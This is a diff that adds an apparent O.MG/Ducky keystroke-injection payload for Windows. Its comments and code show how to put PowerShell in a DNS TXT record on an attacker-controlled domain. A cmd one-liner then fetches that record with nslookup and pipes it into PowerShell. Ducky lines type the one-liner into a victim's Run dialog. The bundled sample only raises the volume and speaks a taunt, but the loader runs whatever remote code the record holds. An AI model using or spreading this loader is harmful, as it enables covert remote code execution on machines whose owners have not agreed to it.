@@ -1,0 +1,48 @@
+#-----------------------------------------------------------------------------------------------------------
+# Title:        Use a DNS TXT record to get the commands you want to execute instead of typing them in 
+# Description:  An example of how you could use DNS TXT records to get the powershell code you want to run.
+#               This POC will get some commands that will play a message on a victims computer using Windows
+#               build speach engine. It also turns up the volume first, then speak out loud the text you want.               
+# Author:       Keld Norman / Twitter: @keld_norman
+# Props:        Google, RTFM, and trial and errors
+# Version:      1.0
+# Category:     Execution
+# Target:       Windows10+ Powershell
+# Attackmodes:  HID
+#-----------------------------------------------------------------------------------------------------------
+# Quick Guide
+#-----------------------------------------------------------------------------------------------------------
+# First You must setup a DNS TXT record.
+# 
+# I use Cloudflare where is is just to go to the DNS tab and select "Add record", then select the type: TXT
+#
+# Example from Cloudflare where i call my new txt record for "omg": 
+#
+# Type    Name    Content                                        TTL   Proxy 
+# TXT     omg     Insert-the-line-below-here[Max 2048 chars]     Auto  NO
+#
+# As an example/a test you could insert this one liner (the below line) in the "Content field" for the TXT record 
+#
+$keyPresses=[Math]::Ceiling(100/2);$obj=New-Object -ComObject WScript.Shell;for($i = 0;$i -lt $keyPresses;$i++){$obj.SendKeys([char] 175)};$sp=New-Object -ComObject SAPI.SpVoice;$sp.Speak("Today is $((Get-Date).DayOfWeek) and you just got OMG'd")
+#
+# NB: be aware that TXT records can be at a maximum of 2048 chars and that they often are split in to 
+# several 255 chars lines that will break your command.
+#-----------------------------------------------------------------------------------------------------------
+# Then just execute this in a windows terminal ( WIN+R then CMD and enter ) to use the build in Windows nslookup command
+# to retrieve the commands you want to run from your TXT record:
+#-----------------------------------------------------------------------------------------------------------
+#
+for /f "tokens=* USEBACKQ" %a in (`nslookup "-q=txt" omg.yourdomain.com 2^>nul^|find /I """"`) do @echo|set /p="%~a"|powershell -Command -
+#
+#-----------------------------------------------------------------------------------------------------------
+# In OMG code that would be: 
+#-----------------------------------------------------------------------------------------------------------
+DUCKY_LANG US
+GUI r
+DELAY 1000
+STRING CMD
+ENTER
+DELAY 500 
+STRING for /f "tokens=* USEBACKQ" %a in (`nslookup "-q=txt" omg.yourdomain.com 2^>nul^|find /I """"`) do @echo|set /p="%~a"|powershell -Command -
+ENTER
+#-----------------------------------------------------------------------------------------------------------
